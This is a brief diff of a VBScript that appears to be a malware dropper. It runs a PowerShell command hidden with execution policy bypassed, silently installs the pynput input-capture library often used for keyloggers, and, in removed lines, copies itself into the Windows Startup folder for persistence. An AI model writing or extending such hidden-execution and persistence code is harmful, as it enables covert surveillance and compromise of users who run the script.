@@ -28,10 +28,7 @@ psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
 ' Run the PowerShell command (silent mode)
 objShell.Run "cmd /c " & psCommand, 0, True
 
-' Copy itself to the Startup folder for persistence
-startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\"
-currentScript = WScript.ScriptFullName
-objFSO.CopyFile currentScript, startupPath & "b.vbs", True
+
 
 ' Install pynput in the background
 objShell.Run "cmd /c ""pip install pynput""", 0, True
